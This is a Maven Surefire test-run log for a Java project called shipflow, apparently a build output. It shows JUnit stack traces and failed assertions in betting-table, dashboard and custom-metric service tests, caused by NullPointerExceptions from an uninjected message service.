	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   BettingTableServiceTest.generateSlotsForCycle_WhenNoTeams_ShouldThrowException:380 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "No teams found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.generateSlotsForCycle(BettingTableService.java:175)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$generateSlotsForCycle_WhenNoTeams_ShouldThrowException$13(BettingTableServiceTest.java:378)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.generateSlotsForCycle_WhenNoTeams_ShouldThrowException(BettingTableServiceTest.java:378)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   BettingTableServiceTest.updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException:303 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "Cannot resize slot"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.updateSlotDates(BettingTableService.java:338)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException$10(BettingTableServiceTest.java:301)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException(BettingTableServiceTest.java:301)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   BettingTableServiceTest.updateSlotDates_WhenOutsideCycle_ShouldThrowException:291 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "within cycle dates"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.updateSlotDates(BettingTableService.java:330)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$updateSlotDates_WhenOutsideCycle_ShouldThrowException$9(BettingTableServiceTest.java:289)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenOutsideCycle_ShouldThrowException(BettingTableServiceTest.java:289)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   CustomDashboardServiceTest$UserContextFilterTests.shouldThrowExceptionWhenUserNotAuthorized:441 Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenCalculatingNonExistentMetric:403 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenNotAuthorizedToCalculate:414 Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForDuplicateName:173 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForInvalidFormula:152 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenDeletingNonExistentMetric:285 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenNotAuthorizedToDelete:296 Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenGettingNonExistentMetric:355 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
